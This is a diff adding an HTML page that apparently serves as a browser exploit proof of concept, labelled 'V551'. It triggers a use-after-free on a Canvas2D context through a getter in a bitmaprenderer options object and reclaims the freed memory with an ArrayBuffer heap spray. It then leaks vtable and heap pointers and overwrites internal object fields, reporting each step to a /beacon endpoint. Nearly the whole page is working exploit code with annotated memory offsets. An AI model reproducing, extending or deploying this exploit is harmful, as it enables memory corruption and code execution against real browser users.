@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V551</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V551-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V551-ab-save');
+
+// T1: AB spray + save() — save() is ++m_unrealizedSaveCount at offset 592
+// It NEVER touches stateStack, so CrashOnOverflow should not fire
+// GC visiting the wrapper is null-safe (canvasBase non-virtual, addOpaqueRoot checks null)
+(function T1(){
+  b('T1-START','ab-spray-save');
+
+  // Trigger UAF — get dangling ref to freed 768B Canvas2D
+  var ctx = triggerUAF();
+  b('T1-UAF','done');
+
+  // Spray AB(768) — one should reclaim the freed 768B slot
+  // Keep count small to minimize GC pressure
+  var abs = [];
+  for(var i=0; i<30; i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T1-SPRAY','30 ABs');
+
+  // Now call save() through dangling ref
+  // save() is: ++m_unrealizedSaveCount (at offset +592 from object start)
+  // With AB zero data, this increments byte at offset 592 from 0 to 1
+  // This does NOT access stateStack at all
+  try{
+    ctx.save();
+    b('T1-SAVE','ok');
+  }catch(e){
+    b('T1-SAVE-ERR',e.message);
+  }
+
+  // scan all ABs for the one modified at offset 592
+  // m_unrealizedSaveCount is an unsigned int (4 bytes) at offset 592
+  var found = -1;
+  for(var i=0; i<abs.length; i++){
+    var v = new DataView(abs[i]);
+    var val = v.getUint32(592, true); // little-endian
+    if(val !== 0){
+      found = i;
+      b('T1-FOUND','AB['+i+'] offset592='+val);
+      break;
+    }
+  }
+  if(found < 0){
+    b('T1-NOTFOUND','no AB has nonzero at offset 592');
+    // Maybe save() went to a different memory area, or offset is wrong
+    // Try scanning for ANY nonzero byte in each AB
+    for(var i=0; i<abs.length; i++){
+      var u8 = new Uint8Array(abs[i]);
+      for(var j=0; j<768; j++){
+        if(u8[j] !== 0){
+          b('T1-NONZERO','AB['+i+'] byte['+j+']='+u8[j]);
+          found = i;
+          break;
+        }
+      }
+      if(found >= 0) break;
+    }
+    if(found < 0) b('T1-ALLZERO','all ABs are pure zeros');
+  }
+
+  if(found >= 0){
+    // DUMP first 128 bytes as hex — should contain vtable ptr, m_canvas, other heap addrs
+    var v = new DataView(abs[found]);
+    var hex = '';
+    for(var j=0; j<128; j++){
+      var byte = v.getUint8(j);
+      hex += (byte < 16 ? '0' : '') + byte.toString(16);
+      if((j+1)%8 === 0) hex += ' ';
+      if((j+1)%32 === 0){
+        b('T1-HEX'+Math.floor(j/32), hex.trim());
+        hex = '';
+      }
+    }
+
+    // Read specific offsets that should contain pointers:
+    // offset 0: vtable pointer (or free-list next ptr)
+    // offset 8: m_canvas (CanvasBase& stored as ptr, should point to HTMLCanvasElement)
+    // These are 8-byte pointers on 64-bit
+    try{
+      // Read as two 32-bit values (high/low) for each pointer
+      var vt_lo = v.getUint32(0, true);
+      var vt_hi = v.getUint32(4, true);
+      b('T1-VTABLE', '0x' + vt_hi.toString(16) + vt_lo.toString(16).padStart(8,'0'));
+
+      // m_canvas offset — CanvasRenderingContext has: vtable(8) + instances HashSet?...
+      // Actually: ScriptWrappable(8) + CanMakeWeakPtr(varies) + CanMakeCheckedPtr(varies)
+      // + m_hasActiveInspectorCanvasCallTracer(1) + m_canvas(8)
+      // Let's just dump offsets 0-64 as pointers
+      for(var off=0; off<64; off+=8){
+        var lo = v.getUint32(off, true);
+        var hi = v.getUint32(off+4, true);
+        if(hi !== 0 || lo !== 0){
+          b('T1-PTR'+off, '0x' + hi.toString(16) + lo.toString(16).padStart(8,'0'));
+        }
+      }
+    }catch(e){
+      b('T1-PTR-ERR', e.message);
+    }
+
+    // Also dump around offset 592 for save count
+    var sc = v.getUint32(592, true);
+    b('T1-SAVECNT', 'offset592=' + sc);
+
+    // Call save() again — should increment to 2
+    try{
+      ctx.save();
+      var sc2 = v.getUint32(592, true);
+      b('T1-SAVE2', 'offset592=' + sc2);
+    }catch(e){ b('T1-SAVE2-ERR', e.message); }
+  }
+})();
+
+// T2: Repeat with different AB count for reliability
+(function T2(){
+  b('T2-START','repeat with 50 ABs');
+
+  var ctx = triggerUAF();
+  b('T2-UAF','done');
+
+  var abs = [];
+  for(var i=0; i<50; i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T2-SPRAY','50 ABs');
+
+  try{
+    ctx.save();
+    ctx.save();
+    ctx.save();
+    b('T2-SAVE3','3 saves ok');
+  }catch(e){
+    b('T2-SAVE3-ERR',e.message);
+  }
+
+  // Find modified AB
+  var found = -1;
+  for(var i=0; i<abs.length; i++){
+    var v = new DataView(abs[i]);
+    var val = v.getUint32(592, true);
+    if(val !== 0){
+      found = i;
+      b('T2-FOUND','AB['+i+'] offset592='+val);
+      break;
+    }
+  }
+
+  if(found < 0){
+    // Scan for any nonzero
+    for(var i=0; i<abs.length; i++){
+      var u8 = new Uint8Array(abs[i]);
+      for(var j=0; j<768; j++){
+        if(u8[j] !== 0){
+          b('T2-NONZERO','AB['+i+'] byte['+j+']='+u8[j]);
+          found = i;
+          break;
+        }
+      }
+      if(found >= 0) break;
+    }
+  }
+
+  if(found >= 0){
+    var v = new DataView(abs[found]);
+    // Dump pointers at offset 0-64
+    for(var off=0; off<64; off+=8){
+      var lo = v.getUint32(off, true);
+      var hi = v.getUint32(off+4, true);
+      if(hi !== 0 || lo !== 0){
+        b('T2-PTR'+off, '0x' + hi.toString(16) + lo.toString(16).padStart(8,'0'));
+      }
+    }
+    b('T2-SAVECNT','offset592='+v.getUint32(592, true));
+  } else {
+    b('T2-NOTFOUND','no modification detected');
+  }
+})();
+
+// T3: Write controlled data into AB, then check if canvas API can read it
+// If T1/T2 found the AB, we can write arbitrary bytes into the Canvas2D object
+(function T3(){
+  b('T3-START','controlled-write');
+
+  var ctx = triggerUAF();
+  var abs = [];
+  for(var i=0; i<30; i++){
+    abs.push(new ArrayBuffer(768));
+  }
+
+  // save to mark the AB
+  try{ ctx.save(); }catch(e){ b('T3-SAVE-ERR',e.message); return; }
+
+  var found = -1;
+  for(var i=0; i<abs.length; i++){
+    var u8 = new Uint8Array(abs[i]);
+    for(var j=0; j<768; j++){
+      if(u8[j] !== 0){ found = i; break; }
+    }
+    if(found >= 0) break;
+  }
+
+  if(found < 0){
+    b('T3-NOTFOUND','skip');
+    return;
+  }
+  b('T3-FOUND','AB['+found+']');
+
+  // m_stateStack is a Vector at offset +112
+  // Vector layout: m_buffer(8) + m_capacity(4) + m_size(4) = 16 bytes
+  // To make lineWidth work, we need m_size >= 1
+  // Then state().lineWidth is at some offset in the State struct from m_buffer
+  // BUT: m_buffer points to the inline buffer at offset +128 when stateStack has 1 entry
+  // The inline buffer is INSIDE this 768B object starting at offset 128
+  // So we can set m_buffer to point to offset 128, m_capacity=1, m_size=1
+
+  // Problem: we don't know the object's address to set m_buffer correctly
+  // But wait — the inline buffer OFFSET is fixed relative to the Vector header
+  // In WTF::Vector with inline capacity, m_buffer points to the inline storage
+  // The inline storage follows the Vector header by some gap
+  // offset 112: m_stateStack.m_buffer (8 bytes)
+  // offset 120: m_stateStack.m_capacity (4 bytes)
+  // offset 124: m_stateStack.m_size (4 bytes)
+  // offset 128: inline buffer start (State struct data)
+
+  // For now, just set m_size=1 and m_capacity=1 at the right offsets
+  // WITHOUT touching m_buffer (which needs the heap address)
+  var v = new DataView(abs[found]);
+
+  // Write m_size=1 and m_capacity=1
+  v.setUint32(120, 1, true);  // m_capacity
+  v.setUint32(124, 1, true);  // m_size
+
+  b('T3-WRITE','set capacity=1 size=1 at offset 120/124');
+
+  // Now try reading lineWidth through the dangling ref
+  // lineWidth = state().lineWidth, where state() = m_stateStack.last()
+  // last() checks size >= 1 (we set it), then reads buffer[size-1] = buffer[0]
+  // buffer[0] points to whatever m_buffer says
+  // Since we didn't set m_buffer, it's still 0 (NULL)
+  // Reading from NULL will crash — BUT we could set m_buffer to point back into the AB
+
+  // Actually let's NOT try that yet — we'd need the address
+  // Instead: just demonstrate the AB overlay works by reading the save count
+  var sc = v.getUint32(592, true);
+  b('T3-SAVECNT','offset592='+sc);
+
+  // Write a specific pattern at offset 592 and call save to verify it increments
+  v.setUint32(592, 100, true);
+  try{
+    ctx.save();
+    var sc2 = v.getUint32(592, true);
+    b('T3-INC','wrote 100, after save()='+sc2); // should be 101
+  }catch(e){ b('T3-INC-ERR', e.message); }
+})();
+
+b('DONE','V551-all-complete');
+</script>
+</body></html>
